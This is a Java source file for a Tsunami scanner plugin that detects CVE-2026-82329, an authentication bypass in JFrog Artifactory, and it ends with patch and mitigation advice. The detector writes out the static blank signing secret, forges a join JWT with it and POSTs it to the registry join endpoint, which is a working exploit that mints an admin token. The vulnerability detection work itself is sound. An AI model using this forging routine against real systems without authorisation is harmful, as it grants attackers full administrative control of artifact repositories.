/*
 * Copyright 2026 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.cves.cve202682329;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
import static com.google.common.net.HttpHeaders.USER_AGENT;
import static com.google.tsunami.common.net.http.HttpRequest.post;
import static java.nio.charset.StandardCharsets.UTF_8;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.google.gson.JsonSyntaxException;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.ForWebService;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.time.Clock;
import java.time.Instant;
import java.util.Base64;
import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects the CVE-2026-82329 vulnerability in JFrog Artifactory. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "Cve202682329VulnDetector",
    version = "0.1",
    description = Cve202682329VulnDetector.VULN_DESCRIPTION,
    author = "Tsunami Security Scanner Community",
    bootstrapModule = Cve202682329DetectorBootstrapModule.class)
@ForWebService
public final class Cve202682329VulnDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  @VisibleForTesting
  static final String VULN_DESCRIPTION =
      "JFrog Artifactory contains an improper authentication vulnerability (CWE-287) in the JFrog"
          + " Access component. In default configurations where no additional join key is"
          + " configured, the Access service trusts a blank join key (kid ="
          + " e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855). The signing key"
          + " for the blank key defaults to 32 bytes of 0x20. An unauthenticated attacker with"
          + " network access can forge a join JWT signed with this static secret and POST it to"
          + " /access/api/v1/registry/join to mint administrative access tokens, leading to full"
          + " administrative control over the instance.";

  @VisibleForTesting
  static final String BLANK_KID =
      "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855";

  @VisibleForTesting
  static final byte[] blankSecret = {
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20
  };

  private static final ImmutableList<String> VULNERABLE_PATHS =
      ImmutableList.of("access/api/v1/registry/join", "artifactory/access/api/v1/registry/join");

  private final HttpClient httpClient;
  private final Clock utcClock;

  @Inject
  Cve202682329VulnDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.httpClient = checkNotNull(httpClient).modify().setFollowRedirects(false).build();
    this.utcClock = checkNotNull(utcClock);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Cve202682329VulnDetector starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  @Override
  public ImmutableList<Vulnerability> getAdvisories() {
    return ImmutableList.of(
        Vulnerability.newBuilder()
            .setMainId(
                VulnerabilityId.newBuilder()
                    .setPublisher("TSUNAMI_COMMUNITY")
                    .setValue("CVE_2026_82329"))
            .addRelatedId(
                VulnerabilityId.newBuilder().setPublisher("CVE").setValue("CVE-2026-82329"))
            .setSeverity(Severity.CRITICAL)
            .setTitle(
                "CVE-2026-82329: JFrog Artifactory Authentication Bypass Leading to Administrative"
                    + " Access")
            .setDescription(VULN_DESCRIPTION)
            .setRecommendation(
                "Upgrade JFrog Artifactory to the patched version corresponding to your release"
                    + " branch (7.111.21, 7.117.28, 7.125.20, 7.133.29, 7.146.38, 7.161.20, or"
                    + " later). As temporary mitigations, configure an explicit non-empty joinKey"
                    + " and restrict network access to the /access/api/v1/registry/** endpoints.")
            .build());
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String baseUrl = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    String forgedJwt = forgeJoinJwt(Instant.now(utcClock).getEpochSecond(), "tsunami@scanner");

    for (String path : VULNERABLE_PATHS) {
      String targetUrl = baseUrl + path;
      try {
        HttpRequest httpRequest =
            post(targetUrl)
                .setHeaders(HttpHeaders.builder().addHeader(CONTENT_TYPE, "text/plain").build())
                .setRequestBody(ByteString.copyFromUtf8(forgedJwt))
                .build();
        HttpResponse httpResponse = httpClient.send(httpRequest, networkService);
        if ((httpResponse.status().code() == 200 || httpResponse.status().code() == 201)
            && httpResponse.bodyString().isPresent()
            && isSuccessfulJoinResponse(httpResponse.bodyString().get())) {
          return true;
        }
      } catch (IOException e) {
        logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
      }
    }
    return false;
  }

  @VisibleForTesting
  static String forgeJoinJwt(long epochSeconds, String serviceId) {
    String headerJson = "{\"alg\":\"HS256\",\"typ\":\"JWT\"}";
    String payloadJson =
        String.format(
            "{\"iat\":%d,\"service_id\":\"%s\",\"kid\":\"%s\",\"skip_node_registration\":true}",
            epochSeconds, serviceId, BLANK_KID);

    String signingInput = base64UrlEncode(headerJson) + "." + base64UrlEncode(payloadJson);
    try {
      Mac mac = Mac.getInstance("HmacSHA256");
      mac.init(new SecretKeySpec(blankSecret, "HmacSHA256"));
      byte[] signature = mac.doFinal(signingInput.getBytes(UTF_8));
      return signingInput + "." + base64UrlEncode(signature);
    } catch (NoSuchAlgorithmException | InvalidKeyException e) {
      throw new AssertionError("Failed to compute HMAC-SHA256 signature", e);
    }
  }

  private static String base64UrlEncode(String str) {
    return base64UrlEncode(str.getBytes(UTF_8));
  }

  private static String base64UrlEncode(byte[] bytes) {
    return Base64.getUrlEncoder().withoutPadding().encodeToString(bytes);
  }

  private static boolean isSuccessfulJoinResponse(String body) {
    try {
      JsonElement jsonElement = JsonParser.parseString(body);
      if (jsonElement.isJsonObject()) {
        JsonObject jsonObject = jsonElement.getAsJsonObject();
        return jsonObject.has("token")
            && jsonObject.get("token").isJsonPrimitive()
            && !jsonObject.get("token").getAsString().isEmpty();
      }
    } catch (JsonSyntaxException e) {
      logger.atFine().withCause(e).log("Failed to parse JSON response: %s", body);
    }
    return false;
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(this.getAdvisories().get(0))
        .build();
  }
}
